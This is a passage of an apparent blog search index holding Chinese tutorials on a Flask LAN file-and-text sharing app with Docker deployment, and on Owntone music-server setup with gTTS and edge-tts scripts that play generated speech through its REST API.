app.config[\u0026#39;SQLALCHEMY_TRACK_MODIFICATIONS\u0026#39;] = False app.config[\u0026#39;UPLOAD_FOLDER\u0026#39;] = UPLOAD_FOLDER db = SQLAlchemy(app) # ======================= # 数据表 # ======================= class Share(db.Model): id = db.Column(db.Integer, primary_key=True) hash = db.Column(db.String(64), unique=True, nullable=False) text = db.Column(db.Text, nullable=True) filename = db.Column(db.String(255), nullable=True) created_at = db.Column(db.DateTime, default=datetime.utcnow) expires_at = db.Column(db.DateTime, nullable=False) # ======================= # 首页表单 # ======================= @app.route(\u0026#39;/\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def index(): if request.method == \u0026#39;POST\u0026#39;: text = request.form.get(\u0026#39;text\u0026#39;) file = request.files.get(\u0026#39;file\u0026#39;) expires_in = int(request.form.get(\u0026#39;expires_in\u0026#39;, 60)) # 有效期，默认60分钟 uid = str(uuid.uuid4()).encode(\u0026#39;utf-8\u0026#39;) hash_value = hashlib.sha256(uid).hexdigest() filename = None if file and file.filename: filename = f\u0026#34;{hash_value}_{file.filename}\u0026#34; file.save(os.path.join(UPLOAD_FOLDER, filename)) expires_at = datetime.utcnow() + timedelta(minutes=expires_in) share = Share(hash=hash_value, text=text, filename=filename, expires_at=expires_at) db.session.add(share) db.session.commit() link = url_for(\u0026#39;get_share\u0026#39;, hash=hash_value, _external=True) return render_template_string(SUCCESS_TEMPLATE, link=link, expires_in=expires_in) return render_template_string(FORM_TEMPLATE) # ======================= # 访问分享内容 # ======================= @app.route(\u0026#39;/s/\u0026lt;hash\u0026gt;\u0026#39;) def get_share(hash): share = Share.query.filter_by(hash=hash).first() if not share: return render_template_string(ERROR_TEMPLATE, message=\u0026#34;链接不存在\u0026#34;) if datetime.utcnow() \u0026gt; share.expires_at: return render_template_string(ERROR_TEMPLATE, message=\u0026#34;链接已过期\u0026#34;) return render_template_string(SHARE_TEMPLATE, share=share) @app.route(\u0026#39;/uploads/\u0026lt;filename\u0026gt;\u0026#39;) def download_file(filename): return send_from_directory(UPLOAD_FOLDER, filename, as_attachment=True) # ======================= # 页面模板 # ======================= FORM_TEMPLATE = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;局域网分享工具\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-light\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container py-5\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;row justify-content-center\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;col-lg-8\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card shadow\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;card-body\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-4 text-center\u0026#34;\u0026gt;🔗 局域网分享工具\u0026lt;/h1\u0026gt; \u0026lt;form method=\u0026#34;post\u0026#34; enctype=\u0026#34;multipart/form-data\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;mb-3\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;form-label\u0026#34;\u0026gt;输入文字\u0026lt;/label\u0026gt; \u0026lt;textarea name=\u0026#34;text\u0026#34; class=\u0026#34;form-control\u0026#34; rows=\u0026#34;4\u0026#34; placeholder=\u0026#34;请输入要分享的文字\u0026#34;\u0026gt;\u0026lt;/textarea\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mb-3\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;form-label\u0026#34;\u0026gt;选择文件\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;file\u0026#34; name=\u0026#34;file\u0026#34; class=\u0026#34;form-control\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;div class=\u0026#34;mb-3\u0026#34;\u0026gt; \u0026lt;label class=\u0026#34;form-label\u0026#34;\u0026gt;过期时间（分钟）\u0026lt;/label\u0026gt; \u0026lt;input type=\u0026#34;number\u0026#34; name=\u0026#34;expires_in\u0026#34; class=\u0026#34;form-control\u0026#34; value=\u0026#34;60\u0026#34; min=\u0026#34;1\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;button type=\u0026#34;submit\u0026#34; class=\u0026#34;btn btn-primary w-100\u0026#34;\u0026gt;生成分享链接\u0026lt;/button\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; SUCCESS_TEMPLATE = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;生成成功\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-success-subtle\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container py-5 text-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-4\u0026#34;\u0026gt;✅ 生成成功！\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;链接有效期：{{ expires_in }} 分钟\u0026lt;/p\u0026gt; \u0026lt;div class=\u0026#34;mb-3\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; readonly class=\u0026#34;form-control text-center\u0026#34; value=\u0026#34;{{ link }}\u0026#34;\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;a href=\u0026#34;{{ link }}\u0026#34; class=\u0026#34;btn btn-success\u0026#34;\u0026gt;访问分享链接\u0026lt;/a\u0026gt; \u0026lt;br\u0026gt;\u0026lt;br\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34; class=\u0026#34;btn btn-outline-secondary mt-3\u0026#34;\u0026gt;返回主页\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; SHARE_TEMPLATE = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;分享内容\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-white\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container py-5\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-4 text-center\u0026#34;\u0026gt;📦 分享内容\u0026lt;/h1\u0026gt; {% if share.text %} \u0026lt;h4\u0026gt;文本内容：\u0026lt;/h4\u0026gt; \u0026lt;div class=\u0026#34;p-3 border bg-light mb-4\u0026#34;\u0026gt; \u0026lt;pre\u0026gt;{{ share.text }}\u0026lt;/pre\u0026gt; \u0026lt;/div\u0026gt; {% endif %} {% if share.filename %} \u0026lt;h4\u0026gt;附件下载：\u0026lt;/h4\u0026gt; \u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;download_file\u0026#39;, filename=share.filename) }}\u0026#34; class=\u0026#34;btn btn-primary\u0026#34;\u0026gt;下载文件\u0026lt;/a\u0026gt; {% endif %} \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; ERROR_TEMPLATE = \u0026#39;\u0026#39;\u0026#39; \u0026lt;!doctype html\u0026gt; \u0026lt;html lang=\u0026#34;zh-CN\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;错误\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026#34;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body class=\u0026#34;bg-danger-subtle\u0026#34;\u0026gt; \u0026lt;div class=\u0026#34;container py-5 text-center\u0026#34;\u0026gt; \u0026lt;h1 class=\u0026#34;mb-4\u0026#34;\u0026gt;⚠️ 出错了\u0026lt;/h1\u0026gt; \u0026lt;p\u0026gt;{{ message }}\u0026lt;/p\u0026gt; \u0026lt;a href=\u0026#34;/\u0026#34; class=\u0026#34;btn btn-outline-secondary mt-3\u0026#34;\u0026gt;返回主页\u0026lt;/a\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026#39;\u0026#39;\u0026#39; # ======================= # 启动 # ======================= if __name__ == \u0026#39;__main__\u0026#39;: with app.app_context(): db.create_all() app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) requirements.txt\nFlask==3.0.0 Flask-SQLAlchemy==3.1.1 Dockerfile\nFROM python:3.11-slim WORKDIR /app COPY requirements.txt . COPY app.py . RUN pip install --no-cache-dir -r requirements.txt RUN mkdir -p /app/uploads \u0026amp;\u0026amp; mkdir -p /app/data EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 启动 docker build -t flask-share . docker run -d --name flask-share -p 5000:5000 \\ -v $PWD/uploads:/app/uploads \\ -v $PWD/data:/app/data \\ flask-share 访问\n用手机或其他设备访问：http://192.168.1.100:5000\n输入文字、上传文件、一键生成唯一链接，链接在有效期内可访问，过期自动失效， 文件和数据库都持久化到宿主机\n","permalink":"https://qfsyso.github.io/posts/clipboard/","summary":"共享粘贴板 可以在一个设备输入文字，生成一个链接，其他设备在同一局域网内用链接访问可获取文字\n用 Python (Flask) + 对称加密 (Fernet) 来实现\n📂 项目结构 lan-clipboard/\n├── app.py\n├── requirements.txt\n└── Dockerfile\nrequirements.txt flask cryptography app.py from flask import Flask, request, redirect, url_for, render_template_string, abort from cryptography.fernet import Fernet import os app = Flask(__name__) # 生成或从环境变量读取密钥 FERNET_KEY = os.environ.get(\u0026#34;FERNET_KEY\u0026#34;) or Fernet.generate_key().decode() fernet = Fernet(FERNET_KEY.encode()) # 简单内存存储 (可替换为文件或数据库) storage = {} # 简单页面模板 FORM_HTML = \u0026#34;\u0026#34;\u0026#34; \u0026lt;!doctype html\u0026gt; \u0026lt;title\u0026gt;LAN Clipboard\u0026lt;/title\u0026gt; \u0026lt;h1\u0026gt;LAN Clipboard\u0026lt;/h1\u0026gt; \u0026lt;form action=\u0026#34;/share\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;textarea name=\u0026#34;text\u0026#34; rows=\u0026#34;10\u0026#34; cols=\u0026#34;50\u0026#34; placeholder=\u0026#34;输入文字.","title":"Clipboard"},{"content":"Owntone Owntone（以前叫 forked-daapd）是一个自建音乐服务器，支持：\n音乐库管理（本地音乐）， AirPlay / Chromecast / Roon / MPD 等协议， 播放列表 / 电台 / 播放控制， 通过 REST API 控制。\nTTS（文本转语音） 用外部TTS 如 Google TTS ， Edge TTS， OpenAI TTS生成.wav .mp3， 放入媒体库文件夹 ，通过API刷新 添加 播放。\nOwntone创建 # 确保有写权限： sudo chown -R 1000:1000 /var/cache/owntone sudo chmod -R 755 /var/cache/owntone docker run -d \\ --name=OwnTone1 \\ --network=host \\ -e UID=1000 \\ -e GID=1000 \\ -v /etc/owntone:/etc/owntone \\ -v /mnt/media:/srv/media \\ -v /var/cache/owntone:/var/cache/owntone \\ --restart unless-stopped \\ owntone/owntone:latest # 停止删除 docker stop OwnTone1 \u0026amp;\u0026amp; docker rm OwnTone1 # 精简版 docker run -d \\ --name=OwnTone1 \\ --network=host \\ -v /root/owntone/config:/etc/owntone \\ -v /root/owntone/media:/srv/media/ \\ -v /root/owntone/cache:/var/cache/owntone \\ --restart unless-stopped \\ docker.io/owntone/owntone:28.12 gTTS app.py\nimport os import time from gtts import gTTS import requests # === 配置区 === OWNTONE_URL = \u0026#34;http://127.0.0.1:3689\u0026#34; # Owntone 的 API 地址 MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # 你的宿主机挂载目录 TTS_FILENAME = \u0026#34;tts_output.mp3\u0026#34; # TTS 文件名 # === 1) 生成 TTS === text = \u0026#34;你好，我是 Owntone 的 TTS 播放示例\u0026#34; tts = gTTS(text, lang=\u0026#34;zh-CN\u0026#34;) tts_file_path = os.path.join(MEDIA_PATH, TTS_FILENAME) tts.save(tts_file_path) print(f\u0026#34;✅ 已生成 TTS 文件：{tts_file_path}\u0026#34;) # === 2) 刷新媒体库 === print(\u0026#34;🔄 刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 200: print(\u0026#34;✅ 已请求刷新\u0026#34;) else: print(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) # === 3) 等待扫描完成 === print(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 4) 搜索 TTS 文件 === print(\u0026#34;🔍 搜索 TTS 文件...\u0026#34;) try: search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search?query={TTS_FILENAME}\u0026#34;) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) exit(1) search_json = search_resp.json() tracks = search_json.get(\u0026#34;tracks\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到 TTS 文件，API 返回: {search_json}\u0026#34;) exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] print(f\u0026#34;✅ 找到 TTS 文件，ID: {track_id}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) print(f\u0026#34;搜索接口返回: {search_resp.text}\u0026#34;) exit(1) # === 5) 加到队列 === print(\u0026#34;➕ 加入播放队列...\u0026#34;) add_resp = requests.post( f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34;, json={\u0026#34;uris\u0026#34;: [f\u0026#34;library:track:{track_id}\u0026#34;]} ) if add_resp.status_code == 200: print(\u0026#34;✅ 已加入队列\u0026#34;) else: print(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) # === 6) 播放 === print(\u0026#34;▶️ 播放...\u0026#34;) play_resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34;) if play_resp.status_code == 200: print(\u0026#34;✅ 已开始播放\u0026#34;) else: print(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) 要点 PUT /api/rescan 代替了老的 POST /api/library/refresh， 增加了对返回码和异常的判断， 如果搜索失败会打印返回内容，方便调试。\n如果需要用户名密码，要把 URL 写成： OWNTONE_URL = \u0026#34;http://username:password@127.0.0.1:3689\u0026#34; 搜索根据API调整搜索 # 4 print(\u0026#34;🔍 搜索 TTS 文件（修正版）...\u0026#34;) try: params = { \u0026#34;query\u0026#34;: TTS_FILENAME, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34; } search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) exit(1) search_json = search_resp.json() tracks_obj = search_json.get(\u0026#34;tracks\u0026#34;, {}) tracks = tracks_obj.get(\u0026#34;items\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到 TTS 文件，API 返回: {search_json}\u0026#34;) exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] track_title = tracks[0].get(\u0026#34;title\u0026#34;, \u0026#34;N/A\u0026#34;) print(f\u0026#34;✅ 找到 TTS 文件，ID: {track_id}，标题: {track_title}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) print(f\u0026#34;搜索接口返回: {search_resp.text if search_resp else \u0026#39;无响应\u0026#39;}\u0026#34;) exit(1) 添加列表/播放调整 正确返回code 204 import os import time from gtts import gTTS import requests # === 配置区 === OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; # Owntone 的 API 地址 MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # 你的宿主机挂载目录 TTS_FILENAME = \u0026#34;tts_output1.mp3\u0026#34; # TTS 文件名 # === 1) 生成 TTS === text = \u0026#34;你好，我是 Owntone 的 TTS 播放示例\u0026#34; tts = gTTS(text, lang=\u0026#34;zh-CN\u0026#34;) tts_file_path = os.path.join(MEDIA_PATH, TTS_FILENAME) tts.save(tts_file_path) print(f\u0026#34;✅ 已生成 TTS 文件：{tts_file_path}\u0026#34;) # === 2) 刷新媒体库 === print(\u0026#34;🔄 刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: print(\u0026#34;✅ 已请求刷新\u0026#34;) else: print(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) # === 3) 等待扫描完成 === print(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 4) 搜索 TTS 文件（更标准） === print(\u0026#34;🔍 搜索 TTS 文件（修正版）...\u0026#34;) try: params = { \u0026#34;query\u0026#34;: TTS_FILENAME, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34; } search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) exit(1) search_json = search_resp.json() tracks_obj = search_json.get(\u0026#34;tracks\u0026#34;, {}) tracks = tracks_obj.get(\u0026#34;items\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到 TTS 文件，API 返回: {search_json}\u0026#34;) exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] track_title = tracks[0].get(\u0026#34;title\u0026#34;, \u0026#34;N/A\u0026#34;) print(f\u0026#34;✅ 找到 TTS 文件，ID: {track_id}，标题: {track_title}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) print(f\u0026#34;搜索接口返回: {search_resp.text if search_resp else \u0026#39;无响应\u0026#39;}\u0026#34;) exit(1) # === 5) 加入播放队列 === print(\u0026#34;➕ 加入播放队列...\u0026#34;) try: add_url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; params = { \u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34; } add_resp = requests.post(add_url, params=params) if add_resp.status_code != 200: print(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) exit(1) print(\u0026#34;✅ 已加入播放队列\u0026#34;) except Exception as e: print(f\u0026#34;❌ 加队列异常: {e}\u0026#34;) exit(1) # === 6) 播放 === print(\u0026#34;▶️ 播放...\u0026#34;) try: play_url = f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34; play_resp = requests.put(play_url) if play_resp.status_code != 204: print(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) exit(1) print(\u0026#34;✅ 已开始播放\u0026#34;) except Exception as e: print(f\u0026#34;❌ 播放异常: {e}\u0026#34;) exit(1) 运行 python app.py 即可看到 程序开始生成音频并推送Owntone播放\n封装成一个文件 tts_play.py\n#!/usr/bin/env python3 import os import sys import time from datetime import datetime from gtts import gTTS import requests # === 配置 === OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; # Owntone 的 API 地址 MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # 宿主机挂载到 Owntone 的目录 LANG = \u0026#34;zh-CN\u0026#34; # TTS 语言 # === 1) 获取要读的文字 === if len(sys.argv) \u0026lt; 2: print(\u0026#34;❗ 用法: python tts_play.py \\\u0026#34;要朗读的文字\\\u0026#34;\u0026#34;) sys.exit(1) text = sys.argv[1] timestamp = datetime.now().strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;) tts_filename = f\u0026#34;tts_{timestamp}.mp3\u0026#34; tts_file_path = os.path.join(MEDIA_PATH, tts_filename) # === 2) 生成 TTS 文件 === print(f\u0026#34;🗣️ 正在生成 TTS: {tts_file_path}\u0026#34;) tts = gTTS(text, lang=LANG) tts.save(tts_file_path) print(f\u0026#34;✅ 已生成 TTS 文件: {tts_file_path}\u0026#34;) # === 3) 刷新 Owntone 媒体库 === print(\u0026#34;🔄 正在刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: print(\u0026#34;✅ 已请求刷新\u0026#34;) else: print(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) sys.exit(1) except Exception as e: print(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) sys.exit(1) # === 4) 等待扫描 === print(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 5) 搜索 TTS 文件 === print(\u0026#34;🔍 正在搜索 TTS 文件...\u0026#34;) try: params = { \u0026#34;query\u0026#34;: tts_filename, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34; } search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) sys.exit(1) search_json = search_resp.json() tracks = search_json.get(\u0026#34;tracks\u0026#34;, {}).get(\u0026#34;items\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到 TTS 文件，API 返回: {search_json}\u0026#34;) sys.exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] track_title = tracks[0].get(\u0026#34;title\u0026#34;, \u0026#34;N/A\u0026#34;) print(f\u0026#34;✅ 找到 TTS 文件 ID: {track_id}，标题: {track_title}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) sys.exit(1) # === 6) 加入播放队列 === print(\u0026#34;➕ 正在加入播放队列...\u0026#34;) try: add_url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; add_params = { \u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34; } add_resp = requests.post(add_url, params=add_params) if add_resp.status_code != 200: print(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 已加入播放队列\u0026#34;) except Exception as e: print(f\u0026#34;❌ 加队列异常: {e}\u0026#34;) sys.exit(1) # === 7) 播放 === print(\u0026#34;▶️ 正在播放...\u0026#34;) try: play_url = f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34; play_resp = requests.put(play_url) if play_resp.status_code != 204: print(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 已开始播放 🎉\u0026#34;) except Exception as e: print(f\u0026#34;❌ 播放异常: {e}\u0026#34;) sys.exit(1) 运行示例\npython tts_play.py \u0026#34;你好，我是 Owntone 的 TTS 播放示例\u0026#34; 依赖\npip install gTTS requests 要点 自动带时间戳，防止覆盖， 完整流程：生成 → 刷库 → 搜索 → 加队列 → 播放， 失败时退出码 ≠ 0，方便做定时任务或外部调用检测， 这样就一条命令从生成到播放。\nedge-tts + Owntone #!/usr/bin/env python3 import os import sys import time import asyncio from datetime import datetime import requests import edge_tts # 用的是异步版 # === 配置 === OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; # Owntone API MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # Owntone 宿主机挂载目录 VOICE = \u0026#34;zh-CN-XiaoxiaoNeural\u0026#34; # 微软 Edge TTS 的中文自然女声 # === 检查参数 === if len(sys.argv) \u0026lt; 2: print(\u0026#34;❗ 用法: python tts_play_edge.py \\\u0026#34;要朗读的文字\\\u0026#34;\u0026#34;) sys.exit(1) text = sys.argv[1] timestamp = datetime.now().strftime(\u0026#34;%Y%m%d%H%M%S\u0026#34;) tts_filename = f\u0026#34;tts_{timestamp}.mp3\u0026#34; tts_file_path = os.path.join(MEDIA_PATH, tts_filename) async def main(): # === 1) 使用 edge-tts 生成 TTS === print(f\u0026#34;🗣️ 正在用 Edge-TTS 生成：{tts_file_path}\u0026#34;) communicate = edge_tts.Communicate(text, VOICE) await communicate.save(tts_file_path) print(f\u0026#34;✅ 已生成 TTS 文件: {tts_file_path}\u0026#34;) # === 2) 刷 Owntone 库 === print(\u0026#34;🔄 正在刷新 Owntone 媒体库...\u0026#34;) try: resp = requests.put(f\u0026#34;{OWNTONE_URL}/api/rescan\u0026#34;) if resp.status_code == 204: print(\u0026#34;✅ 已请求刷新\u0026#34;) else: print(f\u0026#34;⚠️ 刷新失败: {resp.status_code} {resp.text}\u0026#34;) sys.exit(1) except Exception as e: print(f\u0026#34;❌ 刷新异常: {e}\u0026#34;) sys.exit(1) # === 3) 等待 === print(\u0026#34;⏳ 等待 5 秒以保证文件被扫描...\u0026#34;) time.sleep(5) # === 4) 搜索文件 === print(\u0026#34;🔍 正在搜索 TTS 文件...\u0026#34;) try: params = {\u0026#34;query\u0026#34;: tts_filename, \u0026#34;type\u0026#34;: \u0026#34;track\u0026#34;} search_resp = requests.get(f\u0026#34;{OWNTONE_URL}/api/search\u0026#34;, params=params) if search_resp.status_code != 200: print(f\u0026#34;❌ 搜索失败: {search_resp.status_code} {search_resp.text}\u0026#34;) sys.exit(1) search_json = search_resp.json() tracks = search_json.get(\u0026#34;tracks\u0026#34;, {}).get(\u0026#34;items\u0026#34;, []) if not tracks: print(f\u0026#34;❌ 没找到 TTS 文件，API 返回: {search_json}\u0026#34;) sys.exit(1) track_id = tracks[0][\u0026#34;id\u0026#34;] track_title = tracks[0].get(\u0026#34;title\u0026#34;, \u0026#34;N/A\u0026#34;) print(f\u0026#34;✅ 找到 TTS 文件 ID: {track_id}，标题: {track_title}\u0026#34;) except Exception as e: print(f\u0026#34;❌ 搜索异常: {e}\u0026#34;) sys.exit(1) # === 5) 加队列 === print(\u0026#34;➕ 正在加入播放队列...\u0026#34;) try: add_url = f\u0026#34;{OWNTONE_URL}/api/queue/items/add\u0026#34; add_params = {\u0026#34;uris\u0026#34;: f\u0026#34;library:track:{track_id}\u0026#34;} add_resp = requests.post(add_url, params=add_params) if add_resp.status_code != 200: print(f\u0026#34;⚠️ 加队列失败: {add_resp.status_code} {add_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 已加入播放队列\u0026#34;) except Exception as e: print(f\u0026#34;❌ 加队列异常: {e}\u0026#34;) sys.exit(1) # === 6) 播放 === print(\u0026#34;▶️ 正在播放...\u0026#34;) try: play_url = f\u0026#34;{OWNTONE_URL}/api/player/play\u0026#34; play_resp = requests.put(play_url) if play_resp.status_code != 204: print(f\u0026#34;⚠️ 播放失败: {play_resp.status_code} {play_resp.text}\u0026#34;) sys.exit(1) print(\u0026#34;✅ 已开始播放 🎉\u0026#34;) except Exception as e: print(f\u0026#34;❌ 播放异常: {e}\u0026#34;) sys.exit(1) if __name__ == \u0026#34;__main__\u0026#34;: asyncio.run(main()) tts_play_edge.py\n安装依赖\npip install edge-tts requests 运行 python tts_play_edge.py \u0026#34;你好，这是一条 Edge TTS 的 Owntone 播放示例\u0026#34; 优点 edge-tts 是微软 Edge 浏览器的官方语音合成，效果比 gTTS（Google Translate）更自然， 可选多种中文/英文语音，支持调节语速/情感， 全流程和 gTTS 版一致，一条命令就能跑。\n声音选择 tts_play.py\nimport os import sys import time import asyncio from datetime import datetime import requests import edge_tts # === 配置 === OWNTONE_URL = \u0026#34;http://192.168.80.39:3689\u0026#34; # Owntone API MEDIA_PATH = \u0026#34;/mnt/media\u0026#34; # 宿主机挂载的媒体库路径 # 可选的中文声音 VOICES = { \u0026#34;xiaoxiao\u0026#34;: \u0026#34;zh-CN-XiaoxiaoNeural\u0026#34;, # 普通女声 \u0026#34;xiaoyi\u0026#34;: \u0026#34;zh-CN-XiaoyiNeural\u0026#34;, # 活泼女声 \u0026#34;yunxi\u0026#34;: \u0026#34;zh-CN-YunxiNeural\u0026#34;, # 稳重男声 \u0026#34;yunjian\u0026#34;: \u0026#34;zh-CN-YunjianNeural\u0026#34; # 男声 } async def main(): # === 解析命令行 === if len(sys.argv) \u0026lt; 2: print(f\u0026#34;用法: python tts_play.py \\\u0026#34;要读的文字\\\u0026#34; [voice]\\n可选 voice: {\u0026#39;, \u0026#39;.join(VOICES.keys())}\u0026#34;) sys.exit(1) text = \u0026#34; 